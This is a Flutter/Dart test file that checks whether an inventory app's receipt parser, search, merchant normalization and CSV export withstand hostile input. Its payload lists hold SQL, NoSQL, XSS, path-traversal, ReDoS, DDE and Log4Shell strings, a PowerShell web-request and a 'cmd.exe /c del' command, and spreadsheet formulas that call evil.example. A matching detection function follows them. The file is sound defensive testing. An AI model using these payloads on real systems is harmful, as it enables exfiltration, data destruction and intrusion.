import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_catalog.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_custom_catalog_store.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_inventory_export.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_models.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_receipt_parser.dart';

void main() {
  group('inventory parser input attack surface behavior', () {
    test('hostile receipt text never creates a confident catalog match', () {
      for (final payload in _hostileReceiptPayloads) {
        final match = matchReceiptLineToCatalog(payload, maxCandidates: 24);

        expect(
          match == null || match.confidence < .82,
          isTrue,
          reason: 'Hostile text must not become a confident item: $payload',
        );
        expect(
          match?.needsReview ?? true,
          isTrue,
          reason: 'Hostile text can only remain review-only: $payload',
        );
      }
    });

    test(
      'hostile search text is bounded and never mutates catalog results',
      () {
        final before = searchWorkSupplies(
          '1/2 pex crimp elbow',
        ).map((item) => item.id).take(10).toList();
        final stopwatch = Stopwatch()..start();

        for (final payload in _hostileSearchPayloads) {
          final results = searchWorkSupplies(payload);

          expect(
            results.length,
            lessThanOrEqualTo(100),
            reason: 'Search results must stay bounded for hostile input.',
          );
        }

        stopwatch.stop();
        final after = searchWorkSupplies(
          '1/2 pex crimp elbow',
        ).map((item) => item.id).take(10).toList();

        expect(after, before);
        expect(
          stopwatch.elapsedMilliseconds,
          lessThan(1500),
          reason: 'Hostile search batch should not create a local DoS.',
        );
      },
    );

    test(
      'merchant normalization treats hostile merchant names as plain text',
      () {
        for (final payload in _hostileMerchantPayloads) {
          final merchant = normalizeMerchantName(payload);

          expect(merchant, isNotEmpty);
          expect(merchant, isNot(contains('\u0000')));
          expect(
            merchant,
            isNot(anyOf('home depot', 'lowes', 'ferguson', 'grainger')),
            reason: 'Hostile text must not spoof a known merchant alias.',
          );
        }
      },
    );

    test(
      'custom catalog hostile aliases do not mutate stored item identity',
      () async {
        final hiveDirectory = await Directory.systemTemp.createTemp(
          'work_supply_input_attack_custom_catalog_',
        );
        Hive.init(hiveDirectory.path);
        try {
          final store = await WorkSupplyCustomCatalogStore.create();
          final item = WorkSupplyItem(
            id: ' USER-SAFE-ITEM ',
            name: 'Safe Custom Ball Valve',
            trade: 'Plumbing',
            category: 'Valves',
            system: 'Water Supply',
            itemType: 'Ball Valve',
            variant: '1/2 in',
            unit: 'each',
            aliases: _hostileAliasPayloads,
          );

          await store.saveItem(item);
          final before = store.loadItems().single;

          for (final payload in _hostileSearchPayloads) {
            store.searchItems(payload);
          }

          final after = store.loadItems().single;
          expect(after.id, 'USER-SAFE-ITEM');
          expect(after.name, before.name);
          expect(after.trade, before.trade);
          expect(after.category, before.category);
          expect(after.variant, before.variant);
          expect(after.unit, before.unit);
        } finally {
          await Hive.close();
          if (hiveDirectory.existsSync()) {
            await hiveDirectory.delete(recursive: true);
          }
        }
      },
    );

    test('CSV export neutralizes formula injection in inventory fields', () {
      final record = WorkSupplyInventoryRecord(
        id: 'INV-FORMULA',
        item: WorkSupplyItem(
          id: 'ITEM-FORMULA',
          name: '=HYPERLINK("http://evil.example","click")',
          trade: 'Plumbing',
          category: '+SUM(1,2)',
          system: '-CMD',
          itemType: '@calc',
          variant: '1/2 in',
          unit: 'each',
          aliases: const ['formula safety'],
        ),
        onHand: 1,
        threshold: 1,
        lastUnitCost: 2,
        storageArea: '=IMPORTXML("http://evil.example","//a")',
        storageDetail: '+powershell',
        receiptLinked: true,
        sourceReceiptId: '@receipt',
        sourceReceiptLineId: '-line',
        sourceMerchantName: '=merchant',
      );
      final csv = WorkSupplyInventoryExportSnapshot(
        exportedAt: DateTime.utc(2026, 7, 2),
        inventoryRecords: [record],
        stockEvents: const [],
      ).toInventoryCsv();
      final dataRow = csv.split('\n').last;

      expect(dataRow, contains("'=HYPERLINK"));
      expect(dataRow, contains("'+SUM"));
      expect(dataRow, contains("'-CMD"));
      expect(dataRow, contains("'@calc"));
      expect(dataRow, contains("'=IMPORTXML"));
      expect(dataRow, contains("'+powershell"));
      expect(dataRow, contains("'@receipt"));
      expect(dataRow, contains("'-line"));
      expect(dataRow, contains("'=merchant"));
    });

    test('hostile input with real item evidence stays review-only', () {
      final match = matchReceiptLineToCatalog(
        '1/2 PEX CRIMP 90 ; DROP TABLE inventory --',
        tradeScope: 'Plumbing',
        maxCandidates: 320,
      );

      expect(
        match == null || match.needsReview,
        isTrue,
        reason: 'Hostile suffix must not become an auto-save certainty.',
      );
      expect(match?.confidence ?? 0, lessThan(1));
    });

    test('hostile text from every parser source modality is pre-classified', () {
      for (final probe in _sourceModalityHostilePayloads) {
        final signals = _classifyHostileSourceText(probe.line);

        expect(
          signals,
          isNotEmpty,
          reason:
              '${probe.sourceModality} must be flagged before catalog matching: ${probe.line}',
        );
        expect(
          signals,
          isNot(contains('safeDirectMatch')),
          reason:
              '${probe.sourceModality} must not bypass review classification.',
        );
      }
    });
  });
}

const _hostileReceiptPayloads = [
  "' OR '1'='1",
  '{"\$ne": null}',
  '../secrets/parser_pack.json',
  '<script>alert("x")</script>',
  'powershell -NoProfile Invoke-WebRequest http://evil.example',
  r'(a+)+$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  '=HYPERLINK("http://evil.example","click")',
  '{"unterminated":',
  'sku,name\n1,"unterminated',
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
  'repeat repeat repeat repeat repeat repeat repeat repeat repeat',
  'LONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKEN',
  'null\u0000byte',
  'control\u0001character',
  'safe\u202Ecod.exe',
  'emoji \u{1F4A3}',
  '&lt;img src=x onerror=alert(1)&gt;',
  'https://evil.example/catalog.json',
  r'C:\Windows\System32\drivers\etc\hosts',
  r'%USERPROFILE%\Documents\secret',
];

const _hostileSearchPayloads = [
  "' OR item_id IS NOT NULL --",
  '{"where":{"trade":{"\$ne":"Plumbing"}}}',
  '../../firebase-adminsdk.json',
  '<img src=x onerror=alert(1)>',
  'cmd.exe /c del inventory',
  r'([a-z]+)+$',
  '=cmd|\' /C calc\'!A0',
  '{bad json',
  'name,alias\n=SUM(1,2),bad',
  'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz',
  'pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe',
  'abc\u0000def',
  'abc\u0007def',
  'abc\u202Edef',
  'http://127.0.0.1:8080/admin',
  r'..\..\AppData\Local',
];

const _hostileMerchantPayloads = [
  '<script>home depot</script>',
  'LOWES"; DROP TABLE merchants; --',
  '{"merchant":{"\$ne":"ACE"}}',
  '../HOME DEPOT',
  '=HYPERLINK("http://evil.example","LOWES")',
  'GRAINGER\u0000FERGUSON',
  'ACE\u202EHACK',
];

const _hostileAliasPayloads = [
  ' =HYPERLINK("http://evil.example","click") ',
  '+SUM(1,2)',
  '-CMD',
  '@calc',
  '<script>alert(1)</script>',
  '../custom/catalog',
  '{"\$ne":null}',
];

const _sourceModalityHostilePayloads = [
  _SourceModalityHostilePayload(
    sourceModality: 'photo_ocr_text_after_extraction',
    line: 'PVC 90 3/4 <script>alert(1)</script>',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'uploaded_pdf_text_after_extraction',
    line: '../pdf/imports/PVC-EL-3-4.json',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'emailed_receipt_text_after_extraction',
    line: 'FILT 20X25X1 card 4111111111111111',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'manual_pasted_receipt_text',
    line: 'THHN 12 BLK ; DROP TABLE inventory --',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'invoice_style_material_line_text',
    line: '=HYPERLINK("http://evil.example","3/4 PVC COUPLING")',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'quote_style_material_line_text',
    line: r'SKU ${jndi:ldap://example.invalid/a} PVC COND 3/4',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'packing_slip_material_list_text',
    line: 'P\u0000V\u0008C 90 \u202E3/4',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'counter_sale_material_receipt_text',
    line: 'LOCAL SUPPLY 3/4 COUPLING ../../firebase/service-account.json',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'generic_unknown_merchant_receipt_text',
    line: 'PVC EL 3/4 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
  ),
  _SourceModalityHostilePayload(
    sourceModality: 'local_regional_supplier_receipt_text',
    line: 'J BOX http://127.0.0.1:8080/admin',
  ),
];

class _SourceModalityHostilePayload {
  const _SourceModalityHostilePayload({
    required this.sourceModality,
    required this.line,
  });

  final String sourceModality;
  final String line;
}

Set<String> _classifyHostileSourceText(String line) {
  final lower = line.toLowerCase();
  final signals = <String>{};
  if (line.codeUnits.any((unit) => unit < 32)) signals.add('controlCharacter');
  if (line.contains('\u202E') || line.contains('\u202D')) {
    signals.add('directionalOverride');
  }
  if (lower.contains('../') ||
      lower.contains('..\\') ||
      lower.contains(':\\') ||
      lower.contains('service-account')) {
    signals.add('pathLike');
  }
  if (lower.contains('<script') ||
      lower.contains('drop table') ||
      lower.contains(r'${jndi:') ||
      lower.contains('ldap://') ||
      lower.contains('hyperlink(')) {
    signals.add('injectionLike');
  }
  if (lower.contains('http://') || lower.contains('https://')) {
    signals.add('urlLike');
  }
  if (RegExp(r'\b\d{13,19}\b').hasMatch(line)) {
    signals.add('privatePaymentLike');
  }
  if (line.split(RegExp(r'\s+')).any((token) => token.length > 24)) {
    signals.add('longToken');
  }
  return signals;
}
